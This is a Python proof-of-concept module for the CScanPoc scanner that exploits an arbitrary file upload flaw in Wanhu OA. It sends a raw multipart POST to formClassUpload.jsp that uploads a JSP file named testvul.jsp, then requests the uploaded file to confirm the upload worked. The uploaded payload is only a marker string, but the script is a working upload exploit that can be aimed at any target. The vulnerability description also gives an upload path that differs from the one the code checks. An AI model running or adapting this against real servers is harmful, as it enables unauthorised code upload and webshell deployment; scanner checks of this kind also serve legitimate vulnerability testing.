# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Whir_0011'  # 平台漏洞编号，留空
    name = '万户OA系统 文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        万户软件是一个坚持网络风格是最大限度提升软件健壮性的一种有效手段，因为这样一来，决定应用并发数的并不是软件平台本身，而是硬件和网络速度；也就是说，从理论上讲，类似万户协同ezOFFICE这样的软件平台没有严格的并发数限制。
        万户OA系统 /defaultroot/devform/workflow/testvul.jsp页面未做限制，可上传任意文件。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '万户OA'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '930240d2-e62e-4e4c-9c4d-db8005675923'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-17'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            raw = '''
POST /defaultroot/customize/formClassUpload.jsp?flag=1&returnField=null HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:42.0) Gecko/20100101 Firefox/42.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: 127.0.0.1/defaultroot/customize/formClassUpload.jsp
Cookie: LocLan=zh_cn; JSESSIONID=zXP1WqCc0h80FSvJNVdnj1fGpTJfh2GphR5GYJnJGLLKKKtJdGJN!-668245681
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------11327923318636
Content-Length: 328

-----------------------------11327923318636
Content-Disposition: form-data; name="photo"; filename="testvul.jsp"
Content-Type: application/octet-stream

testvul_uploadfile_test
-----------------------------11327923318636
Content-Disposition: form-data; name="submit"

ä¸ä¼ 
-----------------------------11327923318636--

    '''
            url = self.target + '/defaultroot/customize/formClassUpload.jsp?flag=1&returnField=null'
            # proxy=('127.0.0.1',1234)
            # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
            code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
            shell_path = '/defaultroot/devform/customize/' + 'testvul.jsp'
            code2, head2, res2, errcode2, _url2 = hh.http(
                self.target + shell_path)
            if code2 == 200 and 'testvul_uploadfile_test' in res2:
                # security_hole(url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
